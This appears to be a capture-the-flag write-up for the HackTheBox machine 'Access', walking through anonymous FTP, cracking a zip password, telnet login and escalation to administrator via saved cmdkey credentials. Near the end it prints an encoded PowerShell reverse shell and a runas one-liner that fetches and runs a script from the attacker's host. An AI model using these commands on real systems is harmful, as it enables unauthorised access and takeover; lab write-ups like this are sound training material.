<img width="1094" height="151" alt="image" src="https://github.com/user-attachments/assets/e3cbaf39-2308-4c72-8e2c-ae3b829df55c" />


Access is a easy rated box on htb, this is a old box from 2018 and rated as easy the rating was self explanatory. Starting with a anonymous ftp login which gave a backup file and a passwords proctected zip file the backup.mdb file gave us the passwrd for the zip file and further the zip file conatined the password for the user of the security user in a mail something format, This gave us the user flag

The privilege escalation on this box was also pretty basic and easy as the administrator credentials were saved in the cmdkey and using runas we were able to run any command impersonating  as the user administrator and this gave us the system shell.

 

# Enumeration

## Nmap

```bash
nmap -p- --min-rate=1000 -v -sVC -oN nmap 10.10.10.98

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: -25m58s
```

Ad we see we have 3 ports open ftp, telnet, and http 

Starting with ftp we see anonymous login 

## FTP

```bash
ftp 10.10.10.98                                                                                       
Connected to 10.10.10.98.
220 Microsoft FTP Service
Name (10.10.10.98:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
226 Transfer complete.
ftp> cd Backups 
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-23-18  09:16PM              5652480 backup.mdb
226 Transfer complete.
ftp> binary 
200 Type set to I.
ftp> get backup.mdb
local: backup.mdb remote: backup.mdb
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |********************************************************************************|  5520 KiB  736.97 KiB/s    00:00 ETA
226 Transfer complete.
5652480 bytes received in 00:07 (729.11 KiB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Engineer
250 CWD command successful.
ftp> ls
200 EPRT command successful.
125 Data connection already open; Transfer starting.
08-24-18  01:16AM                10870 Access Control.zip
226 Transfer complete.
ftp> mget *
mget Access Control.zip [anpqy?]? y
200 EPRT command successful.
125 Data connection already open; Transfer starting.
100% |********************************************************************************| 10870       16.69 KiB/s    00:00 ETA
226 Transfer complete.
10870 bytes received in 00:00 (14.32 KiB/s)
ftp> exit
221 Goodbye.

```

We have two folders containing two files a backup.mdb and a access control.zip.

Starting with the backup.mdb we can open it in mdb viewer, this file is basically a data storing file

i Opened this file in a online free mdb tools https://www.mdbopener.com/

Using this i a table named areaadmin table which sounds intresting and after looking into it i found some creds 

<img width="828" height="165" alt="image" src="https://github.com/user-attachments/assets/0423b78b-6e06-4bb2-921a-f2250a608371" />


Now that we have some creds we could try to log in into the telnet service but i found nothing on this, we also had a zip file password protected so we can try to hit these passwords on it and try to open it.

```bash
john hash --wordlist=../pass
Using default input encoding: UTF-8
Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 256/256 AVX2 8x])
Cost 1 (HMAC size) is 10650 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 3 candidates left, minimum 48 needed for performance.
access4u@security (Access Control.zip/Access Control.pst)     
1g 0:00:00:01 DONE (2025-09-18 13:42) 0.7518g/s 2.255p/s 2.255c/s 2.255C/s admin..admin
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

WE se we can use the above password to unzip the contents 

```bash
7z x Access\ Control.zip

7-Zip 24.09 (x64) : Copyright (c) 1999-2024 Igor Pavlov : 2024-11-29
 64-bit locale=en_US.UTF-8 Threads:6 OPEN_MAX:1024, ASM

Scanning the drive for archives:
1 file, 10870 bytes (11 KiB)

Extracting archive: Access Control.zip
--
Path = Access Control.zip
Type = zip
Physical Size = 10870

    
Would you like to replace the existing file:
  Path:     ./Access Control.pst
  Size:     0 bytes
  Modified: 2018-08-23 20:13:52
with the file from archive:
  Path:     Access Control.pst
  Size:     271360 bytes (265 KiB)
  Modified: 2018-08-23 20:13:52
? (Y)es / (N)o / (A)lways / (S)kip all / A(u)to rename all / (Q)uit? A

                         
Enter password (will not be echoed):
Everything is Ok

Size:       271360
Compressed: 10870
```

We can see we have another file named access control.pst now a pst file is also a similar file which stores some data and similarly we could open this and found the content inside of this

<img width="900" height="417" alt="image" src="https://github.com/user-attachments/assets/1d6e5013-9853-44f8-a5f6-5863416932a9" />


While opening this in an online pst viewer we can see we have a mail of some creds, we could try these set of creds and log in to the telnet service 

# Exploitation

Using the creds for security account 

```bash
telnet 10.10.10.98  23 
Trying 10.10.10.98...
Connected to 10.10.10.98.
Escape character is '^]'.
Welcome to Microsoft Telnet Service 

login: security
password: 

*===============================================================
Microsoft Telnet Server.
*===============================================================
C:\Users\security>whoami
access\security
```

We have a shell 

## Shell as NT/Authority

We can list the saved credentials on the shell using cmdkey 

```bash
C:\Users\security>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
```

We see we have credentials of the administrator saved on the machine

We can use runas to run command as administrator using the saved creds and get a shell 

### Powershell Reverse TCP

```bash
echo 'powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA2AC4AMQAzACIALAA5ADAAMAAxACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==' > tcp.ps1
```

We can use [revshells.com](http://revshells.com) to generate a b64 powershell reverse tcp shell and put it into a file named tcp.ps1

and run a python http server to transfer and on the other terminal we can run netcat to capture the shell

### Running Command as administrator

```bash
runas /savecreds /user:ACCESS\Administrator "powershell iex (New-Object Net.Webclient).downloadString('http://10.10.16.13/tcp.ps1')"
```

This is a powershell onliner to download the contents of the tcp.ps1 and give it to the invoke-Expression which executes the powershell

Running this on the Shell we will get a system shell on our netcat listner

```bash
nc -lnvp 9001 
listening on [any] 9001 ...
connect to [10.10.16.13] from (UNKNOWN) [10.10.10.98] 49166

PS C:\Windows\system32> whoami
access\administrator
```
